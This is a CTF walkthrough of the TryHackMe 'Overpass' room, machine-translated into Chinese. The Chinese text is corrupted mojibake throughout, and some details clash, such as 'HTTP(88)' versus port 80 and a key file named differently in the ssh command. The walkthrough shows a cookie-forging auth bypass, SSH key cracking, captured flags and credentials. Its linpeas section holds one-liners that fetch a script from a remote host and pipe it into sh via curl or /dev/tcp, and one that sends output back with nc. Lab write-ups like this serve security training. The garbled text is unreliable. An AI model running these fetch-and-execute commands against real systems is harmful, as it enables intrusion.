# å¤©æ¡¥(è®°å½•/ç©¿è¡Œ)

> åŸæ–‡ï¼š<https://infosecwriteups.com/overpass-write-up-walkthrough-95656cee4c0b?source=collection_archive---------0----------------------->

![](img/66a3e7192d5b25cf1ca4cf22af914761.png)

# ä»‹ç»

è¿™æ˜¯ä¸€ä¸ªç›¸å¯¹å®¹æ˜“çš„[æˆ¿é—´](https://tryhackme.com/room/overpass)è®©ä½ å¼€å§‹ä½¿ç”¨ CTFsï¼Œè¯·éšæ—¶åœ¨ [Twitter](https://twitter.com/Nouureldin_Ehab) å’Œ [Linkedin](https://www.linkedin.com/in/noureldin-ehab-a57940190/) ä¸Šé—®æˆ‘ä»»ä½•é—®é¢˜

# ä¾¦å¯Ÿ

åœ¨ä»»ä½• CTF ä¸­ï¼Œæˆ‘ä»¬éœ€è¦åšçš„ç¬¬ä¸€ä»¶äº‹å°±æ˜¯ä½¿ç”¨ [Nmap](https://nmap.org/) æ‰«æå¼€æ”¾çš„ç«¯å£(å¦‚æœä½ ä¸çŸ¥é“ä»€ä¹ˆæ˜¯ Nmapï¼Œæˆ‘å»ºè®®ä½ æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªæˆ¿é—´

```
sudo nmap -sS -sV {Add your machine ip here}
```

-sS æ ‡å¿—ç”¨äº TCP SYN æ‰«æ

-sV æ ‡å¿—ç”¨äºç‰ˆæœ¬æ‰«æ

è®¿é—®[æ–‡æ¡£](https://nmap.org/docs.html)è·å–æ›´å¤šå…³äºæ——å¸œå’Œå¦‚ä½•ä½¿ç”¨å®ƒä»¬çš„ä¿¡æ¯

![](img/0d04938ad8b6059fcf3275a57538ab0c.png)

(è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°ç«¯å£ 22 (ssh)å’Œ 80 (HTTP)æ˜¯æ‰“å¼€çš„)

ç°åœ¨æˆ‘ä»¬çŸ¥é“äº†å¼€æ”¾ç«¯å£ï¼Œæˆ‘å†³å®šæ£€æŸ¥å®ƒä»¬ï¼Œè®©æˆ‘ä»¬ä» HTTP å¼€å§‹

**HTTP(88):**
è¿™æ˜¯ä¸€ä¸ª web æœåŠ¡å™¨ï¼Œæ‰€ä»¥æˆ‘å°è¯•é€šè¿‡åœ¨æµè§ˆå™¨ä¸­å†™å…¥æœºå™¨ ip åœ°å€æ¥è¿æ¥å®ƒ

![](img/00afee5b135804bca09a32b70cf654c0.png)

å¦‚æ‚¨æ‰€è§ï¼Œåœ¨å³ä¸Šè§’æœ‰ä¸€ä¸ªâ€œå…³äºâ€é¡µé¢

![](img/5a3417398602f52968a5d1a89e2abe49.png)

(è¿™äº›å¯èƒ½æ˜¯æˆ‘ä»¬è¿˜ä¸çŸ¥é“çš„ç”¨æˆ·å)

ç°åœ¨è®©æˆ‘ä»¬æ£€æŸ¥â€œä¸‹è½½â€é¡µé¢

![](img/beb530299733e4225b292e22b367e353.png)

æŸ¥çœ‹æºä»£ç `downloads/src/overpass.go`æˆ‘æ²¡æœ‰å‘ç°ä»»ä½•æœ‰è¶£çš„ä¸œè¥¿ï¼Œæ‰€ä»¥è‡³å°‘ç°åœ¨è®©æˆ‘ä»¬æŠŠå®ƒæ”¾åœ¨ä¸€è¾¹

![](img/87aa5618d9ef0e1ca5b0cab489221d43.png)

ä¸‹ä¸€æ­¥æˆ‘å†³å®šä½¿ç”¨ gobuster(å®ƒæ˜¯ kali ä¸­çš„ä¸€ä¸ªé¢„ä¸‹è½½å·¥å…·ï¼Œè¿™ä¸ªå·¥å…·æ˜¯ç”± OJ Reeves å¼€å‘çš„)æš´åŠ›ç ´è§£ç›®å½•

`gobuster --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u {Add your machine ip here}`

![](img/3696c765b1fffc53bcefda64e74e7539.png)

å¤ªæ£’äº†ï¼Œç°åœ¨æˆ‘ä»¬æ‰¾åˆ°äº†å‡ ä¸ªç›®å½•ï¼Œè®©æˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹

è®©æˆ‘ä»¬ä»`/Admin`å¼€å§‹å§ï¼Œå®ƒæ˜¯æœ€æœ‰è¶£çš„ä¸€éƒ¨

åœ¨ç®¡ç†å‘˜ç™»å½•é¡µé¢ä¸­ï¼Œæˆ‘å°è¯•ä½¿ç”¨ç”¨æˆ·å(â€œadminâ€)å’Œå¯†ç (â€œadminâ€)ç™»å½•ï¼Œæˆ‘å¯ä»¥çœ‹åˆ°å®ƒè°ƒç”¨äº†/api/loginã€‚æˆ‘è¯•è¿‡ XSSï¼Œä½†ä»€ä¹ˆä¹Ÿæ²¡å‘ç”Ÿ

æˆ‘æ£€æŸ¥æºä»£ç (æŒ‰ä¸‹`f12`)

![](img/fdb5897e73a1c3fc51577229182392da.png)

å¦‚ä½ æ‰€è§ï¼Œè¿™é‡Œæœ‰`main.js, and login.js`

**è®©æˆ‘ä»¬å…ˆæ£€æŸ¥ä¸€ä¸‹**`**main.js**`

**![](img/f7551d6e3eab88b17bf9c7ca5b84d3de.png)**

**é‚£é‡Œåªæœ‰`Hello world!`**

****ç°åœ¨è®©æˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹** `**login.js**`**

**![](img/18d64778e9c7d57a76827ee4f303ffce.png)**

**å¨èƒå»ºæ¨¡**

**é€šè¿‡æŸ¥çœ‹`login.js`æ–‡ä»¶ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°å½“ç®¡ç†å‘˜å‡­è¯æ­£ç¡®æ—¶ï¼Œå°†ä¼šåˆ›å»ºä¸€ä¸ª`SessionToken cookie`**

**è§‚å¯Ÿ if è¯­å¥æ£€æŸ¥å“åº”æ˜¯å¦ç­‰äºâ€œä¸æ­£ç¡®çš„å‡­è¯â€çš„å‡½æ•°æ˜¯å¾ˆæœ‰è¶£çš„ã€‚å¦‚æœä¸ºçœŸï¼Œå®ƒå°†æ˜¾ç¤ºä¸€æ¡æ¶ˆæ¯è¯´â€œä¸æ­£ç¡®çš„å‡­è¯â€ï¼Œå¦‚æœä¸ºå‡ï¼Œå®ƒå°†ä¸ºè¿”å›çš„ statusOrCookie è®¾ç½®ä¸€ä¸ªåä¸ºâ€œSessionTokenâ€çš„ cookieï¼Œå¹¶å°†ç”¨æˆ·é‡å®šå‘åˆ°/adminã€‚ä½ å¯èƒ½ä¼šé—®ï¼Œä¸ºä»€ä¹ˆè¿™å¾ˆé‡è¦ï¼Ÿç­”æ¡ˆæ˜¯å®ƒéå¸¸é‡è¦ï¼Œå› ä¸ºå®ƒå°†å…è®¸æˆ‘ä»¬æ·»åŠ ä»»ä½• cookie å€¼ï¼Œå¸Œæœ›å®ƒèƒ½èµ·ä½œç”¨(å¦‚æœä½ æƒ³äº†è§£æ›´å¤šå…³äºä¼šè¯ç®¡ç†å’Œ cookie çš„çŸ¥è¯†ï¼Œæˆ‘æ¨èè¿™ä¸ª[åšå®¢](https://medium.com/seconset/beginner-guide-to-understand-cookies-and-session-management-4676f7c4497)**

# **å‰¥å‰Š**

****çƒ˜çƒ¤ä¸€äº›é¥¼å¹²çš„æ—¶é—´:**
é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨`f12`æ‰“å¼€å¼€å‘è€…çš„å·¥å…·ï¼Œç„¶åæˆ‘ä»¬å»å­˜å‚¨å¹¶é€‰æ‹©é¥¼å¹²ï¼ŒæŒ‰ä¸‹å³ä¸Šè§’çš„`+`ï¼Œå°†åç§°æ”¹ä¸º`SessionToken`ï¼Œå°†è·¯å¾„æ”¹ä¸º`/`**

**![](img/f07686d70a2f76dfc38ac7841a1cd43f.png)**

**ç°åœ¨æˆ‘ä»¬é‡å¯é¡µé¢ï¼Œå®ƒä¼šæŠŠæˆ‘ä»¬é‡å®šå‘åˆ°`/admin`ï¼Œç°åœ¨æˆ‘ä»¬æœ‰äº† RSA å¯†é’¥**

**![](img/e56dfe7eeb9bb6cfb980ac7f6d300ae4.png)**

**ç°åœ¨æˆ‘ä»¬éœ€è¦ç ´è§£è¿™ä¸ª RSA å¯†é’¥ï¼Œæ‰€ä»¥æˆ‘åˆ›å»ºäº†ä¸€ä¸ªåä¸º ssh çš„ç›®å½•(`mkdir ssh`)ï¼Œç„¶åæˆ‘åœ¨ ssh ç›®å½•ä¸­åˆ›å»ºäº†ä¸€ä¸ªåä¸º id_rsa çš„æ–‡ä»¶å¤¹(`nano id_rsa`)ï¼Œæˆ‘ç²˜è´´äº†æˆ‘ä»¬åœ¨å…¶ä¸­æ‰¾åˆ°çš„å¯†é’¥ï¼Œç„¶åæˆ‘æ›´æ”¹äº†è®¿é—®æƒé™(`chmod 600 id_rsa`)**

**ç°åœ¨æˆ‘ä»¬éœ€è¦ä¸‹è½½ç”¨æ¥ç ´è§£ RSA å¯†é’¥çš„è„šæœ¬ï¼Œä½ å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‘½ä»¤ä¸‹è½½(git å…‹éš†[https://github.com/magnumripper/JohnTheRipper](https://github.com/magnumripper/JohnTheRipper)**

**ç°åœ¨æˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªå‘½ä»¤`john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash`è¿è¡Œè„šæœ¬**

**ç°åœ¨æˆ‘ä»¬çŸ¥é“äº† RSA å¯†ç çŸ­è¯­`james13`**

**ç°åœ¨ï¼Œæ—¢ç„¶æˆ‘ä»¬çŸ¥é“äº†ç”¨æˆ·å(james)å’Œ RSA å¯†ç (james13 ),æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‘½ä»¤å°è¯• ssh**

```
ssh -i ssh.key {Add your machine ip here}
yes
james13
```

**![](img/e9db4891ffd3fadad3c85ee364d9ccf5.png)**

**ç°åœ¨æˆ‘ä»¬åœ¨ yaaaaaaay**

**ç°åœ¨æˆ‘ä»¬ä½¿ç”¨`ls`æ¥æŸ¥çœ‹æ–‡ä»¶ï¼Œæˆ‘ä»¬æ‰¾åˆ°ä¸¤ä¸ªæ–‡ä»¶`user.txt`å’Œ`todo.txt`**

**æˆ‘ä»¬ä½¿ç”¨`cat`å‘½ä»¤æ¥æŸ¥çœ‹æ–‡ä»¶å†…å®¹**

```
cat user.txt
```

**![](img/6e6fed0149ebc49bf57d1aa08aebfb20.png)**

**æˆ‘ä»¬å‘ç°äº†ç¬¬ä¸€é¢æ——å¸œ**

*   ****é»‘æ‰æœºå™¨ï¼Œè·å– user.txt ä¸­çš„æ ‡å¿—****

**`thm{65c1aaf000506e56996822c6281e6bf7}`**

**ç°åœ¨æˆ‘ä»¬`cat` todo.txt**

```
cat todo.txt
```

**![](img/457854f2a603da12bef6399033d7ae03.png)**

# **æƒé™æå‡**

**æˆ‘ä»¬è¯•è¯•`ls -la`**

**![](img/f5c990dea9cfb8fd8c1eb408cdf2d629.png)**

**æˆ‘ä»¬çŒ«`.overpass`**

```
cat .overpass
```

**![](img/1dbcfce63fab37f06a706a7353942faf.png)**

**æˆ‘ä»¬å¯ä»¥ç”¨ [rot47 åœ¨çº¿è§£å¯†ç½‘ç«™](https://www.dcode.fr/rot-47-cipher)æ¥è§£å¯†è¿™ä¸ª**

**![](img/d9865aa10bda73c24819dd0e939c9179.png)**

**`{"name":"System","pass":"saydrawnlyingpicture"}`**

**æ­¤æ—¶ï¼Œæˆ‘ä¸çŸ¥é“è¿™ä¸ªç”¨æˆ·åå’Œå¯†ç æ˜¯ä»€ä¹ˆï¼Œæ‰€ä»¥æˆ‘æš‚æ—¶å¿½ç•¥äº†å®ƒä»¬**

**æˆ‘è¢«å›°åœ¨è¿™é‡Œï¼Œæ‰€ä»¥æˆ‘ç”¨è¿™ä¸ª[æŠ¥é“](https://briskets.io/overpass/)æ¥å­¦ä¹ ï¼Œè¿™äº›æ˜¯æˆ‘ç”¨æ¥ç†è§£æŠ¥é“çš„èµ„æº**

# **[linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)**

*   ****ä»€ä¹ˆæ˜¯**[**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)**ï¼Ÿ****

**![](img/03617afcfdb042c84bae3875c7b11d00.png)**

**LinPEAS æ˜¯ä¸€ä¸ªè„šæœ¬ï¼Œç”¨äºæœç´¢æå‡ Linux/Unix*/MacOS ä¸»æœºæƒé™çš„å¯èƒ½é€”å¾„**

*   ****å¦‚ä½•ä½¿ç”¨**[**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)**ï¼Ÿ****

```
#Local network
 sudo python -m SimpleHTTPServer 80 #Host
 curl 10.10.10.10/linpeas.sh | sh #Victim

 #Without curl
 sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
 cat < /dev/tcp/10.10.10.10/80 | sh #Victim

 #Excute from memory and send output back to the host
 nc -lvnp 9002 | tee linpeas.out #Host
 curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```

**(å…³äºå¦‚ä½•ä½¿ç”¨ linpeas çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—® [GitHub/linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) )**

# **å…‹æœ—ä¹”å¸ƒ**

*   ****ä»€ä¹ˆæ˜¯**[**cron job**](https://www.hivelocity.net/kb/what-is-cron-job/)**ï¼Ÿ****

**cron ä½œä¸šæ˜¯ä¸€ä¸ª Linux å‘½ä»¤ï¼Œç”¨äºè°ƒåº¦åœ¨æœªæ¥æŸä¸ªæ—¶é—´æ‰§è¡Œçš„ä»»åŠ¡ã€‚**

# **/etc/å¤–å–**

**æˆ‘äº†è§£äº† linpeas å’Œ cronjob**

# **â­I å–œæ¬¢ä¸ä¸åŒçš„äººè”ç³»ï¼Œæ‰€ä»¥å¦‚æœä½ æƒ³æ‰“æ‹›å‘¼ï¼Œæˆ‘ä¼šå¾ˆé«˜å…´è§åˆ°ä½ ï¼:)**

**[**LinkedIn**](https://www.linkedin.com/in/noureldin-ehab-a57940190/)[**Twitter**](https://twitter.com/Nouureldin_Ehab)**

# **ğŸ”ˆğŸ”ˆInfosec Writeups æ­£åœ¨ç»„ç»‡å…¶é¦–æ¬¡è™šæ‹Ÿä¼šè®®å’Œç½‘ç»œæ´»åŠ¨ã€‚å¦‚æœä½ å¯¹ä¿¡æ¯å®‰å…¨æ„Ÿå…´è¶£ï¼Œè¿™æ˜¯æœ€é…·çš„åœ°æ–¹ï¼Œæœ‰ 16 ä¸ªä»¤äººéš¾ä»¥ç½®ä¿¡çš„æ¼”è®²è€…å’Œå……æ»¡åŠ›é‡çš„è®¨è®ºä¼šè®®ã€‚ [**æŸ¥çœ‹æ›´å¤šè¯¦æƒ…ï¼Œåœ¨æ­¤æ³¨å†Œã€‚**](https://iwcon.live/)**

**[](https://iwcon.live/) [## IWCon2022 - Infosec ä¹¦é¢æŠ¥å‘Šè™šæ‹Ÿä¼šè®®

### ä¸ä¸–ç•Œä¸Šæœ€ä¼˜ç§€çš„ä¿¡æ¯å®‰å…¨ä¸“å®¶å»ºç«‹è”ç³»ã€‚äº†è§£ç½‘ç»œå®‰å…¨ä¸“å®¶å¦‚ä½•å–å¾—æˆåŠŸã€‚å°†æ–°æŠ€èƒ½æ·»åŠ åˆ°æ‚¨çš„â€¦

iwcon.live](https://iwcon.live/)**